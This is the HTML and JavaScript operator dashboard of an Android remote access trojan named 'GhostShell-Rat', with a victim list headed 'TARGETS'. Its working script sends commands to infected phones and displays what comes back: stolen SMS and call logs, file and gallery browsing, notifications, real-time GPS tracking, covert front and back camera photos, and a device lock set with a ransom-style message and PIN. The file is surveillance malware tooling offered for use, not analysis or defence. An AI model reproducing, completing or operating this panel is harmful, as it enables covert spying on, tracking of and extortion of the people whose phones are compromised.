<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>GhostShell-Rat ¬∑ anonymous</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', monospace; }
        :root {
            --bg: #0b0f0e;
            --surface: #141a1a;
            --surface-light: #1f2828;
            --accent-primary: #00ffc3;
            --accent-secondary: #ff3b9e;
            --glow-primary: rgba(0, 255, 195, 0.25);
            --text: #dbdbdb;
            --text-dim: #8fadad;
            --transition: all 0.25s cubic-bezier(0.23, 1, 0.32, 1);
        }
        body { background-color: var(--bg); color: var(--text); min-height: 100vh; padding: 8px; display: flex; align-items: flex-start; justify-content: center; background-image: radial-gradient(circle at 20% 30%, #10312b 0%, transparent 40%); background-attachment: fixed; }
        #sys-loader { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.6s ease, visibility 0.6s; }
        .loader-hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .cyber-bar { width: 260px; height: 6px; background: #1f2b2b; border-radius: 8px; margin: 20px 0 10px; overflow: hidden; }
        .cyber-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); box-shadow: 0 0 18px var(--glow-primary); transition: width 0.3s; }
        .app-container { width: 100%; max-width: 1300px; display: flex; flex-direction: column; gap: 14px; }
        .header { background: var(--surface); border: 1px solid var(--accent-primary); box-shadow: 0 0 15px var(--glow-primary); padding: 1rem 1.2rem; border-radius: 28px; display: flex; align-items: center; justify-content: space-between; }
        .dashboard-grid { display: grid; grid-template-columns: 260px 1fr; gap: 16px; }
        .device-panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 18px 12px; max-height: 70vh; overflow-y: auto; }
        .device-item { background: #1b2626; padding: 14px 12px; border-radius: 18px; cursor: pointer; transition: var(--transition); margin-bottom: 8px; border: 1px solid transparent; }
        .device-item.active { border-color: var(--accent-secondary); box-shadow: 0 0 12px var(--glow-secondary); }
        .main-panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 18px 16px; }
        .status-bar-mod { display: flex; justify-content: space-between; background: #0f1818; padding: 12px 18px; border-radius: 40px; margin-bottom: 22px; border: 1px solid #2a3a3a; }
        .feature-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 12px; }
        .grid-item { background: #1b2828; border: 1px solid #2f4040; border-radius: 24px; padding: 16px 6px; text-align: center; color: var(--accent-primary); transition: var(--transition); cursor: pointer; }
        .grid-item i { font-size: 2rem; margin-bottom: 8px; display: block; color: var(--accent-secondary); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(2, 10, 10, 0.85); backdrop-filter: blur(8px); align-items: center; justify-content: center; z-index: 1000; padding: 16px; }
        .modal-card { background: var(--surface); width: 100%; max-width: 900px; max-height: 85vh; border-radius: 36px; border: 1px solid var(--accent-primary); display: flex; flex-direction: column; overflow: hidden; }
        .modal-header { padding: 20px 24px; background: #101b1b; display: flex; justify-content: space-between; align-items: center; }
        .modal-body { padding: 22px; overflow-y: auto; flex: 1; font-size: 0.9rem; }
        .modal-footer { padding: 16px 22px; background: #0c1616; display: flex; gap: 12px; border-top: 1px solid #2e4545; }
        .toast-popup { position: fixed; top: 24px; right: 24px; background: #121f1f; border-left: 6px solid var(--accent-secondary); padding: 18px 24px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--accent-primary); color: white; z-index: 3000; animation: slideIn 0.3s forwards; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: var(--accent-primary); border-bottom: 1px solid #3d5a5a; padding: 8px; }
        td { padding: 8px; border-bottom: 1px solid #1e2e2e; color: var(--text-dim); }
        input, button { background: #1e2e2e; border: 1px solid #3b5e5e; padding: 10px 18px; border-radius: 20px; color: white; }
        button { background: var(--accent-primary); color: #000; font-weight: bold; border: none; cursor: pointer; }
        @keyframes slideIn { from { transform: translateX(400px); } to { transform: translateX(0); } }
    </style>
</head>
<body>
    <div id="sys-loader"><div id="loader-text">GHOST//SHELL</div><div class="cyber-bar"><div class="cyber-fill" id="loader-fill"></div></div></div>
    <div class="app-container">
        <header class="header"><h1><i class="fas fa-skull"></i> GhostShell-Rat</h1><div class="ghost-icon"><i class="fas fa-ghost"></i></div></header>
        <div class="dashboard-grid">
            <div class="device-panel"><h2>TARGETS</h2><div id="device-list"></div></div>
            <div class="main-panel">
                <div class="status-bar-mod"><span>üéØ <span id="device-info">None</span></span><span>‚ö° <span id="connection-status">OFFLINE</span></span></div>
                <div id="main-grid-panel" class="feature-grid"></div>
            </div>
        </div>
    </div>
    <div id="main-modal" class="modal"><div class="modal-card"><div class="modal-header"><h2 id="modal-title"></h2><span style="cursor:pointer;font-size:2rem;" onclick="closeModal()">&times;</span></div><div class="modal-body" id="modal-body"></div><div class="modal-footer" id="modal-footer"></div></div></div>
    <div id="popup-toast" class="toast-popup" style="display:none;"></div>

    <script>
        (function(){
            let w=0; const f=document.getElementById('loader-fill');
            const i=setInterval(()=>{w+=10; f.style.width=w+'%'; if(w>=100){clearInterval(i); setTimeout(()=>document.getElementById('sys-loader').classList.add('loader-hidden'),500);}},50);
        })();

        let state = { devices: [] }, selectedClientId = null, currentModal = null, clientDataCache = {}, lastDataHashes = {};

        function showPopup(type, msg, duration=6000) {
            const t=document.getElementById('popup-toast'); t.style.display='block';
            t.innerHTML=`<div style="display:flex;align-items:center;gap:12px;"><i class="fas fa-bell"></i><span>${msg}</span></div>`;
            setTimeout(()=>t.style.display='none', duration);
        }

        async function sendCommand(cmd, body={}) {
            if(!selectedClientId) return;
            try { return await (await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd, client_id:selectedClientId, ...body})})).json(); }
            catch(e){ console.error(e); }
        }

        function updateMainDashboard() {
            const grid=document.getElementById('main-grid-panel'); const enabled=!!selectedClientId;
            const buttons=['sms','calls','filemanager','gallery','notifications','apps','lock','openurl','get_location','flash','takebackpic','takefrontpic'];
            grid.innerHTML = buttons.map(btn => {
                let icon='fa-cog', label=btn;
                if(btn==='sms') icon='fa-sms'; else if(btn==='calls') icon='fa-phone'; else if(btn==='filemanager') icon='fa-folder';
                else if(btn==='gallery') icon='fa-images'; else if(btn==='lock') label='LOCK DEVICE', icon='fa-lock';
                else if(btn==='get_location') label='LOKASI REALTIME', icon='fa-crosshairs';
                return `<div class="grid-item" onclick="handleGridClick('${btn}')"><i class="fas ${icon}"></i>${label}</div>`;
            }).join('');
        }

        window.handleGridClick = (act) => {
            if(act==='get_location') sendCommand('get_location');
            else openModal(act);
        }

        function openModal(type) {
            currentModal=type; document.getElementById('main-modal').style.display='flex';
            document.getElementById('modal-title').innerText=type.toUpperCase();
            document.getElementById('modal-body').innerHTML='<p>Loading data from ghost...</p>';
            const map={sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic'};
            if(map[type]) sendCommand(map[type]);
            renderModalContent();
        }

        function closeModal() { 
            if(currentModal==='gallery') sendCommand('exit_gallery');
            document.getElementById('main-modal').style.display='none'; currentModal=null; 
        }

        function renderModalContent() {
            if(!currentModal || !selectedClientId) return;
            const body=document.getElementById('modal-body'), footer=document.getElementById('modal-footer'), data=clientDataCache[selectedClientId]||{};
            footer.innerHTML='';

            if(currentModal==='sms') {
                const logs=data.sms_logs||[];
                body.innerHTML=`<table><tr><th>Sender</th><th>Message</th></tr>${logs.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
            } else if(currentModal==='calls') {
                const logs=data.call_logs||[];
                body.innerHTML=`<table><tr><th>Number</th><th>Duration</th></tr>${logs.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
            } else if(currentModal==='apps') {
                const apps=data.apps||[];
                body.innerHTML=`<table><tr><th>App Name</th><th>Package</th></tr>${apps.map(a=>`<tr><td>${a.appName}</td><td>${a.packageName}</td></tr>`).join('')}</table>`;
            } else if(currentModal==='lock') {
                body.innerHTML=`<div style="text-align:center;"><input id="l-msg" placeholder="Message" style="width:100%;margin-bottom:10px;"><input id="l-pin" placeholder="PIN" style="width:100%;"></div>`;
                footer.innerHTML=`<button onclick="sendLock()" style="width:100%">LOCK</button>`;
            } else if(currentModal==='get_location') {
                if(data.location_url) {
                    const coords = data.location_url.split('q=')[1];
                    body.innerHTML=`<div style="text-align:center;"><iframe width="100%" height="300" src="https://maps.google.com/maps?q=${coords}&z=15&output=embed"></iframe><p style="margin:10px 0;">üìç ${coords}</p><button onclick="sendCommand('stop_location')" style="background:red;color:white;width:100%">STOP TRACKING</button></div>`;
                } else { body.innerHTML='<p>Triangulating GPS...</p>'; }
            } else if(currentModal==='filemanager') {
                const fm=data.file_manager||{path:'/',files:[]};
                body.innerHTML=`<p>Path: ${fm.path}</p><table>${fm.files.map(f=>`<tr><td>${f.isDirectory?'üìÅ':'üìÑ'} ${f.name}</td></tr>`).join('')}</table>`;
            } else if(currentModal.includes('pic')) {
                if(data.camera_image) body.innerHTML=`<img src="/captured_images/${data.camera_image}" style="width:100%;border-radius:10px;">`;
                else body.innerHTML='<p>Capturing photo...</p>';
            }
        }

        window.sendLock = () => { sendCommand(`lock ${document.getElementById('l-msg').value}|${document.getElementById('l-pin').value}`); };

        async function poll() {
            try {
                const res = await (await fetch('/api/status')).json(); state=res;
                const list=document.getElementById('device-list');
                list.innerHTML = state.devices.map(d=>`<div class="device-item ${selectedClientId===d.id?'active':''}" onclick="selectedClientId='${d.id}';updateMainDashboard();"><strong>${d.model}</strong><br><small>${d.id}</small></div>`).join('');
                
                if(selectedClientId) {
                    const d = await (await fetch(`/api/client_data/${selectedClientId}`)).json();
                    clientDataCache[selectedClientId]=d;
                    document.getElementById('device-info').innerText=d.device_info?.Model||selectedClientId;
                    document.getElementById('connection-status').innerText='ONLINE';
                    if(currentModal) renderModalContent();
                    
                    if(d.location_status==='success' && lastDataHashes['loc']!==d.location_url) {
                        lastDataHashes['loc']=d.location_url;
                        showPopup('info', 'üéØ TARGET TRACKED! Buka modal lokasi.');
                    }
                }
            } catch(e){}
            setTimeout(poll, 3000);
        }
        updateMainDashboard(); poll();
    </script>
</body>
</html>
